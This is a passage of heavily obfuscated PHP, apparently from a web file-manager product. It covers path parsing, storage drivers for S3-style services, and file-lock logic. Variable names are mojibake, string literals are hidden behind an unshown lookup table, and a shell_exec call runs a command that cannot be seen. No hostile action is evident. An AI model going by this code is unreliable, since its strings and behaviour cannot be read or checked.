self::KOD_USER_RECYCLE, $½¡°Ş”ú[1349] => self::KOD_USER_FAV, $½¡°Ş”ú[1350] => self::KOD_USER_FILE_TAG, $½¡°Ş”ú[1351] => self::KOD_USER_FILE_TYPE, $½¡°Ş”ú[1352] => self::KOD_GROUP_ROOT_SELF, $½¡°Ş”ú[1353] => self::KOD_USER_SHARE, $½¡°Ş”ú[1354] => self::KOD_USER_SHARE_LINK, $½¡°Ş”ú[1355] => self::KOD_USER_SHARE_TO_ME, $½¡°Ş”ú[1356] => self::KOD_SHARE_ITEM, $½¡°Ş”ú[1357] => self::KOD_SHARE_LINK, $½¡°Ş”ú[1358] => self::KOD_SEARCH, $½¡°Ş”ú[1359] => self::KOD_BLOCK, $½¡°Ş”ú[1360] => self::KOD_IO, $½¡°Ş”ú[1361] => self::KOD_USER_RECENT, $½¡°Ş”ú[1362] => self::KOD_USER_DRIVER); } public static function parse($öå§ÙÕú) { $Óò°Ãªå =& $_SERVER[†ûãı«°]; $öå§ÙÕú = self::clear($öå§ÙÕú); $Ş–ÈÖ” = array_values(self::typeList()); preg_match($Óò°Ãªå[1363], $öå§ÙÕú, $Óªáœß); $£ËÔ ú” = array($Óò°Ãªå[498] => !1, $Óò°Ãªå[1364] => !1, $Óò°Ãªå[495] => !1, $Óò°Ãªå[87] => $öå§ÙÕú, $Óò°Ãªå[1262] => !1, $Óò°Ãªå[1261] => $Óò°Ãªå[12]); if (is_array($Óªáœß) && count($Óªáœß) == 5) { $«ã»˜•„ = $Óò°Ãªå[1365] . $Óªáœß[2] . $Óò°Ãªå[404]; if (in_array($«ã»˜•„, $Ş–ÈÖ”)) { $£ËÔ ú”[$Óò°Ãªå[1262]] = $Óªáœß[1]; $£ËÔ ú”[$Óò°Ãªå[33]] = $«ã»˜•„; $£ËÔ ú”[$Óò°Ãªå[1366]] = substr($«ã»˜•„, 1, -1); $£ËÔ ú”[$Óò°Ãªå[477]] = $Óªáœß[3]; } $£ËÔ ú”[$Óò°Ãªå[1261]] = $Óªáœß[4]; } $›ñÍ·©Ê = array($Óò°Ãªå[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $£ËÔ ú”[$Óò°Ãªå[1329]] = in_array($£ËÔ ú”[$Óò°Ãªå[33]], $›ñÍ·©Ê); return $£ËÔ ú”; } public static function isTruePath($à¼ß£­‰) { $¡ñ˜…’ =& $_SERVER[†ûãı«°]; if (substr($à¼ß£­‰, 0, 1) != $¡ñ˜…’[1365]) { return !0; } if (strpos($à¼ß£­‰, $¡ñ˜…’[485]) === 0) { return !0; } if (strpos($à¼ß£­‰, $¡ñ˜…’[1333]) === 0) { return !0; } if (strpos($à¼ß£­‰, $¡ñ˜…’[1367]) === 0) { return !0; } if (strpos($à¼ß£­‰, $¡ñ˜…’[1368]) === 0) { return !0; } if (strpos($à¼ß£­‰, $¡ñ˜…’[1369]) === 0) { return !0; } return !1; } public static function clear($¿˜Æ‹üÑ) { $¼òîÁ…á =& $_SERVER[†ûãı«°]; $¿˜Æ‹üÑ = str_replace(array($¼òîÁ…á[1167], $¼òîÁ…á[287]), $¼òîÁ…á[53], $¿˜Æ‹üÑ); $¿˜Æ‹üÑ = str_replace($¼òîÁ…á[100], $¼òîÁ…á[8], $¿˜Æ‹üÑ); $°–‹ˆ‹Á = $¼òîÁ…á[1370]; if (substr($¿˜Æ‹üÑ, 0, 3) == $¼òîÁ…á[1371]) { $¿˜Æ‹üÑ = substr($¿˜Æ‹üÑ, 3); } while (strstr($¿˜Æ‹üÑ, $°–‹ˆ‹Á)) { $¿˜Æ‹üÑ = str_replace($°–‹ˆ‹Á, $¼òîÁ…á[8], $¿˜Æ‹üÑ); } $¿˜Æ‹üÑ = preg_replace($¼òîÁ…á[1372], $¼òîÁ…á[8], $¿˜Æ‹üÑ); if ($¿˜Æ‹üÑ == $¼òîÁ…á[8]) { return $¼òîÁ…á[8]; } $¿˜Æ‹üÑ = rtrim($¿˜Æ‹üÑ, $¼òîÁ…á[8]); return $¿˜Æ‹üÑ; } public static function pathTrue($÷×é°–) { $ØÓ‡éˆ =& $_SERVER[†ûãı«°]; if (!$÷×é°–) { return $ØÓ‡éˆ[12]; } $÷×é°– = str_replace($ØÓ‡éˆ[256], $ØÓ‡éˆ[8], str_replace($ØÓ‡éˆ[1373], $ØÓ‡éˆ[8], $÷×é°–)); $÷×é°– = str_replace($ØÓ‡éˆ[256], $ØÓ‡éˆ[8], str_replace($ØÓ‡éˆ[1373], $ØÓ‡éˆ[8], $÷×é°–)); if (!strstr($÷×é°–, $ØÓ‡éˆ[1371])) { return $÷×é°–; } $Ç”¶¨êÍ = explode($ØÓ‡éˆ[8], $÷×é°–); foreach ($Ç”¶¨êÍ as $òì†ÇŠé => $ÄÛ€óƒ¾) { if ($ÄÛ€óƒ¾ !== $ØÓ‡éˆ[1374]) { continue; } for ($Øòøº‰ = $òì†ÇŠé; $Øòøº‰ >= 0; $Øòøº‰--) { if ($Ç”¶¨êÍ[$Øòøº‰] === $ØÓ‡éˆ[10] || $Ç”¶¨êÍ[$Øòøº‰] === $ØÓ‡éˆ[1374] || $Ç”¶¨êÍ[$Øòøº‰] === -1) { continue; } if ($Ç”¶¨êÍ[$Øòøº‰] === $ØÓ‡éˆ[12]) { $Ç”¶¨êÍ[$òì†ÇŠé] = -1; break; } $Ç”¶¨êÍ[$òì†ÇŠé] = -1; $Ç”¶¨êÍ[$Øòøº‰] = -1; break; } } $ìö´ò¼ = array(); foreach ($Ç”¶¨êÍ as $ÄÛ€óƒ¾) { if ($ÄÛ€óƒ¾ !== -1) { $ìö´ò¼[] = $ÄÛ€óƒ¾; } } $ØÆóÑ¨Ö = implode($ØÓ‡éˆ[8], $ìö´ò¼); if (strpos($ØÆóÑ¨Ö, $ØÓ‡éˆ[1375]) === 0) { $ØÆóÑ¨Ö = $ØÓ‡éˆ[1371] . substr($ØÆóÑ¨Ö, strlen($ØÓ‡éˆ[1375])); } return $ØÆóÑ¨Ö; } public static function pathUrlClear($îæÔ°¹µ) { $ø§Ç€ùŞ =& $_SERVER[†ûãı«°]; if (!$îæÔ°¹µ) { return $îæÔ°¹µ; } $îæÔ°¹µ = rawurldecode($îæÔ°¹µ); $îæÔ°¹µ = str_replace($ø§Ç€ùŞ[1373], $ø§Ç€ùŞ[8], $îæÔ°¹µ); if (strpos($îæÔ°¹µ, $ø§Ç€ùŞ[76]) > 0) { $îæÔ°¹µ = substr($îæÔ°¹µ, 0, strpos($îæÔ°¹µ, $ø§Ç€ùŞ[76])); } if (strpos($îæÔ°¹µ, $ø§Ç€ùŞ[1376]) > 0) { $îæÔ°¹µ = substr($îæÔ°¹µ, 0, strpos($îæÔ°¹µ, $ø§Ç€ùŞ[1376])); } return $îæÔ°¹µ; } public static function sourceID($¡º‹ÔéŸ) { $ŠÉ®ƒ¼˜ =& $_SERVER[†ûãı«°]; $ÖÑœ¥Œë = self::parse($¡º‹ÔéŸ); if ($ÖÑœ¥Œë[$ŠÉ®ƒ¼˜[33]] !== self::KOD_SOURCE) { show_json(LNG($ŠÉ®ƒ¼˜[1377]), !1); } return $ÖÑœ¥Œë[$ŠÉ®ƒ¼˜[477]]; } public static function make($±¥Ğì‚÷) { if (!$±¥Ğì‚÷) { return !1; } return self::makePath(self::KOD_SOURCE, intval($±¥Ğì‚÷)); } public static function makeShare($›ÖöÀÅø, $±êæ) { return self::makePath(self::KOD_SHARE_ITEM, $›ÖöÀÅø, $±êæ); } public static function makeFileTypePath($Îò™ÆúÊ) { return self::makePath(self::KOD_USER_FILE_TYPE, $Îò™ÆúÊ); } public static function makeFileTagPath($ İò˜¥ë) { return self::makePath(self::KOD_USER_FILE_TAG, $ İò˜¥ë); } public static function makePath($¢ù¨‰›ù, $ƒ·¶êáŒ = '', $ÍË·”Òø = '') { $õü³¥Øá =& $_SERVER[†ûãı«°]; $Äùöî´ô = substr($¢ù¨‰›ù, 1, -1); $Áö‘¯Â = $õü³¥Øá[1378] . $Äùöî´ô . $õü³¥Øá[1379] . $ƒ·¶êáŒ . $õü³¥Øá[1380]; $Áö‘¯Â = $ÍË·”Òø ? $Áö‘¯Â . $ÍË·”Òø . $õü³¥Øá[8] : $Áö‘¯Â; return $Áö‘¯Â; } public static function hashPath($Î©šµä, $¦²Æä‰« = true) { $í¢ªº¾õ =& $_SERVER[†ûãı«°]; $¹Å‰ãû„ = is_array($Î©šµä) ? $Î©šµä : IO::info($Î©šµä); $®»Š = _get($¹Å‰ãû„, $í¢ªº¾õ[1381], $í¢ªº¾õ[12]); if (!$®»Š && isset($¹Å‰ãû„[$í¢ªº¾õ[237]])) { $®»Š = trim($¹Å‰ãû„[$í¢ªº¾õ[237]], $í¢ªº¾õ[121]); } if (!$®»Š && isset($¹Å‰ãû„[$í¢ªº¾õ[193]]) && $¹Å‰ãû„[$í¢ªº¾õ[193]]) { $¹Å‰ãû„ = IO::info(KodIO::make($¹Å‰ãû„[$í¢ªº¾õ[193]])); $®»Š = _get($¹Å‰ãû„, $í¢ªº¾õ[1381], $í¢ªº¾õ[12]); } $‘Â¢–Š› = md5($¹Å‰ãû„[$í¢ªº¾õ[87]] . $¹Å‰ãû„[$í¢ªº¾õ[79]] . $¹Å‰ãû„[$í¢ªº¾õ[88]]); if (!$®»Š && file_exists($¹Å‰ãû„[$í¢ªº¾õ[87]])) { $®»Š = Cache::get($‘Â¢–Š› . $í¢ªº¾õ[1382]); $®»Š = !1; if (!$®»Š) { $®»Š = IO::hashSimple($¹Å‰ãû„[$í¢ªº¾õ[87]]); Cache::set($‘Â¢–Š› . $í¢ªº¾õ[1382], $®»Š, 3600 * 24 * 30); } } if ($¦²Æä‰« && !$®»Š) { } return $®»Š ? $®»Š : $‘Â¢–Š›; } public static function hashPathSafe($„ıé¤àÁ, $®£è›ÎÓ = true) { $ŒÁÆàæ‚ =& $_SERVER[†ûãı«°]; $àâ–üÈ = self::hashPath($„ıé¤àÁ, $®£è›ÎÓ); return md5($àâ–üÈ . $ŒÁÆàæ‚[1383] . Model($ŒÁÆàæ‚[846])->get($ŒÁÆàæ‚[847])); } public static function initSystemPath() { $™µÊ…˜õ =& $_SERVER[†ûãı«°]; if (defined($™µÊ…˜õ[1384])) { return; } define($™µÊ…˜õ[1384], self::systemPath($™µÊ…˜õ[191])); define($™µÊ…˜õ[1385], self::systemPath($™µÊ…˜õ[1386])); define($™µÊ…˜õ[1387], self::systemPath($™µÊ…˜õ[1388])); define($™µÊ…˜õ[1389], self::systemPath($™µÊ…˜õ[1390])); IOHistory::bindEvent(); } public static function systemPath($‹é£øƒ) { $¹êÀĞÒ =& $_SERVER[†ûãı«°]; $Ú¯Ş†Š• = $¹êÀĞÒ[1391] . ucfirst($‹é£øƒ); $ı³¦À§ = Model($¹êÀĞÒ[846])->get($Ú¯Ş†Š•); if ($ı³¦À§) { return $ı³¦À§; } if ($‹é£øƒ == $¹êÀĞÒ[191]) { $ı³¦À§ = self::make(Model($¹êÀĞÒ[906])->systemRootPathAdd($¹êÀĞÒ[612])); } else { $ı³¦À§ = self::systemPath($¹êÀĞÒ[191]); $äÙ†»× = self::sourceID($ı³¦À§); $ı³¦À§ = self::make(Model($¹êÀĞÒ[906])->mkdir($äÙ†»×, $‹é£øƒ)); } Model($¹êÀĞÒ[846])->set($Ú¯Ş†Š•, $ı³¦À§); return $ı³¦À§; } public static function systemFolder($Ù•£Šôñ) { $ı›±Óğñ = IO_PATH_SYSTEM_SOURCE . $Ù•£Šôñ; $”ü¤èø = Cache::get($ı›±Óğñ); if (!$”ü¤èø) { $ ù‘‹–Ê = IO::infoFullSimple($ı›±Óğñ); if (!$ ù‘‹–Ê) { $”ü¤èø = IO::mkdir($ı›±Óğñ, REPEAT_SKIP); } else { $”ü¤èø = $ ù‘‹–Ê[$_SERVER[†ûãı«°][87]]; } Cache::set($ı›±Óğñ, $”ü¤èø, 3600 * 10); } return $”ü¤èø; } public static function defaultDriver() { return Model($_SERVER[†ûãı«°][843])->defaultDriver(); } public static function defaultIO() { $Ïº’İÄÌ =& $_SERVER[†ûãı«°]; $—Û°û† = self::defaultDriver(); return $Ïº’İÄÌ[1392] . $—Û°û†[$Ïº’İÄÌ[477]] . $Ïº’İÄÌ[1380]; } public static function defaultDriverInit() { static $Û¼™”´Ç = false; if ($Û¼™”´Ç) { return $Û¼™”´Ç; } $Û¼™”´Ç = IO::init(self::defaultIO()); return $Û¼™”´Ç; } public static function fileTypeList() { $­¡İ¾ææ =& $_SERVER[†ûãı«°]; $Øäàûˆˆ = $GLOBALS[$­¡İ¾ææ[6]][$­¡İ¾ææ[1393]]; foreach ($Øäàûˆˆ as $­‡ÉÕÆë => $»ÓÜıé) { $“Ø€‘¬ = $­¡İ¾ææ[1394] . $­‡ÉÕÆë; $…ßÆÄ¡§ = LNG($“Ø€‘¬); if ($“Ø€‘¬ != $…ßÆÄ¡§) { $Øäàûˆˆ[$­‡ÉÕÆë][$­¡İ¾ææ[32]] = $…ßÆÄ¡§; } } return $Øäàûˆˆ; } public static function diskList($¿·˜ŸºÊ = true) { $Ôº„ê¨ = $_SERVER[†ûãı«°][1395]; if ($¿·˜ŸºÊ) { $ é¼„… = Cache::get($Ôº„ê¨); if (is_array($ é¼„…)) { return $ é¼„…; } } $ é¼„… = self::diskListGet(); Cache::set($Ôº„ê¨, $ é¼„…, 60); return $ é¼„…; } public static function diskListGet() { $Ã¶§Ù¾æ =& $_SERVER[†ûãı«°]; $…¦àüäÁ = array(); if ($GLOBALS[$Ã¶§Ù¾æ[6]][$Ã¶§Ù¾æ[1396]] == $Ã¶§Ù¾æ[1397]) { $á¡ñÉ§‚ = $Ã¶§Ù¾æ[1398]; for ($±şèú¬Ö = 0; $±şèú¬Ö < strlen($á¡ñÉ§‚); $±şèú¬Ö++) { $â˜÷Øã = $á¡ñÉ§‚[$±şèú¬Ö] . $Ã¶§Ù¾æ[1399]; if (file_exists($â˜÷Øã)) { $…¦àüäÁ[] = $â˜÷Øã; } } return $…¦àüäÁ; } if (!function_exists($Ã¶§Ù¾æ[101])) { $…¦àüäÁ[] = $Ã¶§Ù¾æ[917]; return $…¦àüäÁ; } $ñ¹ˆ¹Ï¿ = explode($Ã¶§Ù¾æ[287], shell_exec($Ã¶§Ù¾æ[1400])); array_shift($ñ¹ˆ¹Ï¿); array_pop($ñ¹ˆ¹Ï¿); $Í³¦Î•š = array($Ã¶§Ù¾æ[1401], $Ã¶§Ù¾æ[1402], $Ã¶§Ù¾æ[1403], $Ã¶§Ù¾æ[1404], $Ã¶§Ù¾æ[1405], $Ã¶§Ù¾æ[1406], $Ã¶§Ù¾æ[1407], $Ã¶§Ù¾æ[1408]); foreach ($ñ¹ˆ¹Ï¿ as $¬óâØÖ») { $ìàÚå‚ì = preg_split($Ã¶§Ù¾æ[1409], $¬óâØÖ»); $â˜÷Øã = $ìàÚå‚ì[count($ìàÚå‚ì) - 1]; if (!strstr($ìàÚå‚ì[0], $Ã¶§Ù¾æ[1410]) || !$â˜÷Øã) { continue; } $É©Ú´ıÙ = rtrim($â˜÷Øã, $Ã¶§Ù¾æ[8]) . $Ã¶§Ù¾æ[8]; if (in_array($É©Ú´ıÙ, $Í³¦Î•š)) { continue; } $…¦àüäÁ[] = $É©Ú´ıÙ; } return $…¦àüäÁ; } public static function isSameDisk($ñå‰©šÜ, $ßñ¹’ì) { $ìÁ«‘ğ =& $_SERVER[†ûãı«°]; if ($GLOBALS[$ìÁ«‘ğ[6]][$ìÁ«‘ğ[1396]] == $ìÁ«‘ğ[1397]) { return strtolower(substr($ñå‰©šÜ, 0, 1)) == strtolower(substr($ßñ¹’ì, 0, 1)); } $şß£—à = stat($ñå‰©šÜ); $ìÅŒÁ„ù = stat($ßñ¹’ì); if ($şß£—à === !1 || $ìÅŒÁ„ù === !1) { return !1; } return $şß£—à[$ìÁ«‘ğ[1411]] === $ìÅŒÁ„ù[$ìÁ«‘ğ[1411]]; $…´è¹ìĞ = self::diskList(); $åÂÏáÊ´ = !1; $âúÉ‘» = !1; sort($…´è¹ìĞ); $…´è¹ìĞ = array_reverse($…´è¹ìĞ); $ñå‰©šÜ = rtrim($ñå‰©šÜ, $ìÁ«‘ğ[8]) . $ìÁ«‘ğ[8]; $ßñ¹’ì = rtrim($ßñ¹’ì, $ìÁ«‘ğ[8]) . $ìÁ«‘ğ[8]; foreach ($…´è¹ìĞ as $¼ß¹˜ù) { $şå•¨Áµ = strlen($¼ß¹˜ù); if (!$åÂÏáÊ´ && substr($ñå‰©šÜ, 0, $şå•¨Áµ) == $¼ß¹˜ù) { $åÂÏáÊ´ = $¼ß¹˜ù; } if (!$âúÉ‘» && substr($ßñ¹’ì, 0, $şå•¨Áµ) == $¼ß¹˜ù) { $âúÉ‘» = $¼ß¹˜ù; } if ($åÂÏáÊ´ && $âúÉ‘») { break; } } return $åÂÏáÊ´ === $âúÉ‘»; } public static function transferType($äŒ­Öå, $¬©ô¤ï) { $¿‘—‹ô =& $_SERVER[†ûãı«°]; $“ÂÉ© = self::driverType($äŒ­Öå); $åŒ¹Åòü = self::driverType($¬©ô¤ï); if ($“ÂÉ©[$¿‘—‹ô[33]] == $åŒ¹Åòü[$¿‘—‹ô[33]] && $“ÂÉ©[$¿‘—‹ô[1412]] == $åŒ¹Åòü[$¿‘—‹ô[1412]]) { return $¿‘—‹ô[1413]; } if ($“ÂÉ©[$¿‘—‹ô[33]] == $¿‘—‹ô[958] && $åŒ¹Åòü[$¿‘—‹ô[33]] == $¿‘—‹ô[109]) { return $¿‘—‹ô[1290]; } if ($“ÂÉ©[$¿‘—‹ô[33]] == $¿‘—‹ô[109] && $åŒ¹Åòü[$¿‘—‹ô[33]] == $¿‘—‹ô[958]) { return $¿‘—‹ô[110]; } return $¿‘—‹ô[1414]; } public static function driverType($ü­‘›ÎÂ) { $Æ²âî¾ =& $_SERVER[†ûãı«°]; $à×Åß›Ç = str_replace($Æ²âî¾[1415], $Æ²âî¾[12], strtolower($ü­‘›ÎÂ->getType())); if ($à×Åß›Ç == $Æ²âî¾[833] || $à×Åß›Ç == $Æ²âî¾[1416] || $à×Åß›Ç == $Æ²âî¾[1417]) { $ü­‘›ÎÂ = self::defaultDriverInit(); } else { if ($à×Åß›Ç == $Æ²âî¾[1300] || $à×Åß›Ç == $Æ²âî¾[1418]) { $ü­‘›ÎÂ = IO::init($ü­‘›ÎÂ->pathParse[$Æ²âî¾[1243]]); } } $¾´ï¹ìû = $ü­‘›ÎÂ->path; $à×Åß›Ç = str_replace($Æ²âî¾[1415], $Æ²âî¾[12], strtolower($ü­‘›ÎÂ->getType())); if ($à×Åß›Ç == $Æ²âî¾[109]) { return array($Æ²âî¾[33] => $Æ²âî¾[109], $Æ²âî¾[1412] => $Æ²âî¾[12], $Æ²âî¾[87] => $¾´ï¹ìû, $Æ²âî¾[98] => $ü­‘›ÎÂ); } return array($Æ²âî¾[33] => $Æ²âî¾[958], $Æ²âî¾[1412] => $ü­‘›ÎÂ->pathDriver, $Æ²âî¾[87] => $¾´ï¹ìû, $Æ²âî¾[98] => $ü­‘›ÎÂ); } public static function pathDriverType($ÁÈƒÈØå) { return $ÁÈƒÈØå ? self::driverType(IO::init($ÁÈƒÈØå)) : !1; } public static function pathDriverLocal($Š÷¬´Ú) { $÷œú…Ö =& $_SERVER[†ûãı«°]; $¡¾«Ï¯Œ = $Š÷¬´Ú ? self::driverType(IO::init($Š÷¬´Ú)) : !1; return strtolower($¡¾«Ï¯Œ[$÷œú…Ö[33]]) == $÷œú…Ö[109] ? !0 : !1; } public static function allowCover($×›äÖ¼‚, $¸Œö¸Ÿ = true) { $¿¥Ûóœ =& $_SERVER[†ûãı«°]; if (is_string($×›äÖ¼‚)) { $×›äÖ¼‚ = IO::info($×›äÖ¼‚); } if (!$×›äÖ¼‚ || $×›äÖ¼‚[$¿¥Ûóœ[33]] == $¿¥Ûóœ[78] || $×›äÖ¼‚[$¿¥Ûóœ[79]] <= 100) { return !1; } if (isset($×›äÖ¼‚[$¿¥Ûóœ[1419]]) || !$×›äÖ¼‚[$¿¥Ûóœ[87]]) { return !1; } if (isset($×›äÖ¼‚[$¿¥Ûóœ[234]]) && !$×›äÖ¼‚[$¿¥Ûóœ[234]]) { return !1; } static $Æ°†º“£ = false; if (!$Æ°†º“£ || !$¸Œö¸Ÿ) { $§ ›±Ë = self::driverType(IO::init($×›äÖ¼‚[$¿¥Ûóœ[87]])); $¾Ğ˜ˆ” = $§ ›±Ë[$¿¥Ûóœ[98]]; $Æ°†º“£ = $¿¥Ûóœ[196]; if ($§ ›±Ë[$¿¥Ûóœ[33]] == $¿¥Ûóœ[109]) { $Æ°†º“£ = $¿¥Ûóœ[1420]; } if ($§ ›±Ë[$¿¥Ûóœ[98]] && is_array($§ ›±Ë[$¿¥Ûóœ[98]]->config)) { $Ï°î¼—ä = $§ ›±Ë[$¿¥Ûóœ[98]]->config; if (isset($Ï°î¼—ä[$¿¥Ûóœ[1421]]) && $Ï°î¼—ä[$¿¥Ûóœ[1421]]) { $Æ°†º“£ = $¿¥Ûóœ[1420]; } } $‚Ì½ƒ¡¥ = KodIO::defaultDriver(); if (strtolower($‚Ì½ƒ¡¥[$¿¥Ûóœ[98]]) == $¿¥Ûóœ[109] && is_array($‚Ì½ƒ¡¥[$¿¥Ûóœ[6]])) { $éé ¯Ú· = $‚Ì½ƒ¡¥[$¿¥Ûóœ[6]][$¿¥Ûóœ[1273]]; if (substr($éé ¯Ú·, 0, 2) == $¿¥Ûóœ[1422]) { $éé ¯Ú· = str_replace($¿¥Ûóœ[1422], BASIC_PATH, $éé ¯Ú·); } $éé ¯Ú· = str_replace($¿¥Ûóœ[256], $¿¥Ûóœ[8], $éé ¯Ú·); if (substr($×›äÖ¼‚[$¿¥Ûóœ[87]], 0, strlen($éé ¯Ú·)) == $éé ¯Ú·) { $Æ°†º“£ = $¿¥Ûóœ[196]; } } } return $Æ°†º“£ == $¿¥Ûóœ[1420] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ôÈá) { parent::__construct($ôÈá); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($úÖáÒ«õ) { $èººõ¤“ =& $_SERVER[†ûãı«°]; if (substr($úÖáÒ«õ, 0, 7) == $èººõ¤“[218]) { $úÖáÒ«õ = $èººõ¤“[219] . substr($úÖáÒ«õ, 7); } header($èººõ¤“[175] . $úÖáÒ«õ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($£ÏƒÁ ) { parent::__construct($£ÏƒÁ ); $this->setSignVersion($_SERVER[†ûãı«°][249]); } public function uploadFormData($·Çü°­ø, $ØßÕÈş = 3600) { $æÙÃ®µ =& $_SERVER[†ûãı«°]; $¸šËÓ‡ = $æÙÃ®µ[231]; $¼ÚïˆñÆ = $æÙÃ®µ[1423]; $ÇÓ ôÓ¬ = $æÙÃ®µ[263]; $ÆöÒ•‘Ü = gmdate($æÙÃ®µ[1424], time() + $ØßÕÈş); $È†ü¿ = (string) time() . $æÙÃ®µ[74] . (string) (time() + $ØßÕÈş); $ï‰éØËà = array($æÙÃ®µ[264] => $ÆöÒ•‘Ü, $æÙÃ®µ[267] => array(array($æÙÃ®µ[308] => $¸šËÓ‡), array($æÙÃ®µ[268] => $this->bucket), array($æÙÃ®µ[269], $æÙÃ®µ[270], $æÙÃ®µ[12]), array($æÙÃ®µ[272] => $ÇÓ ôÓ¬), array($æÙÃ®µ[1425] => $¼ÚïˆñÆ), array($æÙÃ®µ[1426] => $this->accessKey), array($æÙÃ®µ[1427] => $È†ü¿))); $ï‰éØËà = json_encode($ï‰éØËà); $ÄÍ–çå = hash_hmac($æÙÃ®µ[1423], $È†ü¿, $this->secret); $®±§©î‚ = sha1($ï‰éØËà); $ŠœÂ°¨ = hash_hmac($æÙÃ®µ[1423], $®±§©î‚, $ÄÍ–çå); $ıÑùíÑú = array($æÙÃ®µ[308] => $¸šËÓ‡, $æÙÃ®µ[272] => $ÇÓ ôÓ¬, $æÙÃ®µ[279] => base64_encode($ï‰éØËà), $æÙÃ®µ[1425] => $¼ÚïˆñÆ, $æÙÃ®µ[1426] => $this->accessKey, $æÙÃ®µ[1428] => $È†ü¿, $æÙÃ®µ[1429] => $ŠœÂ°¨, $æÙÃ®µ[208] => $this->getHost()); return $ıÑùíÑú; } public function fileOutImage($‰Ğâê¥¡, $–Œ÷Ï… = 250) { $ŸİÃ ¼… =& $_SERVER[†ûãı«°]; if ($this->size($‰Ğâê¥¡) > 1024 * 1024 * 32) { return $this->fileOutImageServer($‰Ğâê¥¡, $–Œ÷Ï…); } $Ã«ÉÍÈÓ = $this->link($‰Ğâê¥¡); $Ã«ÉÍÈÓ .= $ŸİÃ ¼…[1430] . $–Œ÷Ï… . $ŸİÃ ¼…[1431]; $this->fileOutLink($Ã«ÉÍÈÓ); } public function fileOutLink($¸‡ƒƒğÌ) { $ÈŸÜà’Ø =& $_SERVER[†ûãı«°]; if (substr($¸‡ƒƒğÌ, 0, 7) == $ÈŸÜà’Ø[218]) { $¸‡ƒƒğÌ = $ÈŸÜà’Ø[219] . substr($¸‡ƒƒğÌ, 7); } header($ÈŸÜà’Ø[175] . $¸‡ƒƒğÌ); die; } } goto d ŒÇãÁÚ¹; AªªÖÛĞâ‰: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($•í–Æ·”) { $¦’Öûô½ =& $_SERVER[†ûãı«°]; if (!$this->allowLock()) { return; } $this->_lockCheck($¦’Öûô½[625], $•í–Æ·”); $°Ú—•Ò• = 1; $this->_lockEvent($•í–Æ·”, array($¦’Öûô½[626], $¦’Öûô½[627]), $°Ú—•Ò•); $this->_lockParent($•í–Æ·”, array($¦’Öûô½[627]), $°Ú—•Ò•); $this->_lockEvent($•í–Æ·”, array($¦’Öûô½[628], $¦’Öûô½[629]), $°Ú—•Ò•); $this->_lockCheckEnd($¦’Öûô½[625], $•í–Æ·”); } public function lockCopyEnd($ØÆ±ˆŸŸ) { $†Õ¦åœ =& $_SERVER[†ûãı«°]; if (!$this->allowLock()) { return; } $ÂÜó¨¼‚ = 0; $this->_lockEvent($ØÆ±ˆŸŸ, array($†Õ¦åœ[626], $†Õ¦åœ[627]), $ÂÜó¨¼‚); $this->_lockParent($ØÆ±ˆŸŸ, array($†Õ¦åœ[627]), $ÂÜó¨¼‚); $this->_lockEvent($ØÆ±ˆŸŸ, array($†Õ¦åœ[628], $†Õ¦åœ[629]), $ÂÜó¨¼‚); } public function lockWriteStart($İşŒï¯Î, $Û ÖÃ¢û = '') { $¶¡®’şõ =& $_SERVER[†ûãı«°]; if (!$this->allowLock()) { return; } $this->_lockCheck($¶¡®’şõ[626], $İşŒï¯Î); $«ö’Ó‚© = 1; $this->_lockKey($¶¡®’şõ[630] . $İşŒï¯Î . $¶¡®’şõ[10] . $Û ÖÃ¢û, $«ö’Ó‚©); $this->_lockEvent($İşŒï¯Î, array($¶¡®’şõ[625], $¶¡®’şõ[627]), $«ö’Ó‚©); $this->_lockParent($İşŒï¯Î, array($¶¡®’şõ[625], $¶¡®’şõ[627]), $«ö’Ó‚©); $this->_lockCheckEnd($¶¡®’şõ[626], $İşŒï¯Î); } public function lockWriteEnd($é¬¸ ú¦, $ ×Ÿ¼‚ = '') { $êÂûµš =& $_SERVER[†ûãı«°]; if (!$this->allowLock()) { return; } $£Áµ±ñ• = 0; $this->_lockKey($êÂûµš[630] . $é¬¸ ú¦ . $êÂûµš[10] . $ ×Ÿ¼‚, $£Áµ±ñ•); $this->_lockEvent($é¬¸ ú¦, array($êÂûµš[625], $êÂûµš[627]), $£Áµ±ñ•); $this->_lockParent($é¬¸ ú¦, array($êÂûµš[625], $êÂûµš[627]), $£Áµ±ñ•); } public function lockMoveStart($æÒª¥Ùñ) { $±±ÃÜïÄ =& $_SERVER[†ûãı«°]; if (!$this->allowLock()) { return; } $this->_lockCheck($±±ÃÜïÄ[627], $æÒª¥Ùñ); $€»ƒ¦Ÿ— = 1; $this->_lockKey($±±ÃÜïÄ[631] . $æÒª¥Ùñ, $€»ƒ¦Ÿ—); $this->_lockEvent($æÒª¥Ùñ, array($±±ÃÜïÄ[625], $±±ÃÜïÄ[626]), $€»ƒ¦Ÿ—); $this->_lockParent($æÒª¥Ùñ, array($±±ÃÜïÄ[625], $±±ÃÜïÄ[627]), $€»ƒ¦Ÿ—); $this->_lockEvent($æÒª¥Ùñ, array($±±ÃÜïÄ[632], $±±ÃÜïÄ[628], $±±ÃÜïÄ[629]), $€»ƒ¦Ÿ—); $this->_lockCheckEnd($±±ÃÜïÄ[627], $æÒª¥Ùñ); } public function lockMoveEnd($Çó¤µø–) { $£æÜ©ÜÅ =& $_SERVER[†ûãı«°]; if (!$this->allowLock()) { return; } $ÕşÊÏ§ò = 0; $this->_lockKey($£æÜ©ÜÅ[631] . $Çó¤µø–, $ÕşÊÏ§ò); $this->_lockEvent($Çó¤µø–, array($£æÜ©ÜÅ[625], $£æÜ©ÜÅ[626]), $ÕşÊÏ§ò); $this->_lockParent($Çó¤µø–, array($£æÜ©ÜÅ[625], $£æÜ©ÜÅ[627]), $ÕşÊÏ§ò); $this->_lockEvent($Çó¤µø–, array($£æÜ©ÜÅ[632], $£æÜ©ÜÅ[628], $£æÜ©ÜÅ[629]), $ÕşÊÏ§ò); } private function _lockCheck($¢¶ê‡šú, $•Ó•ÆªŒ) { $ÚËŸå =& $_SERVER[†ûãı«°]; $¿ÑŒÎá§ = $this->sourceInfo($•Ó•ÆªŒ); $òˆàÖôî = $¢¶ê‡šú . $ÚËŸå[10] . 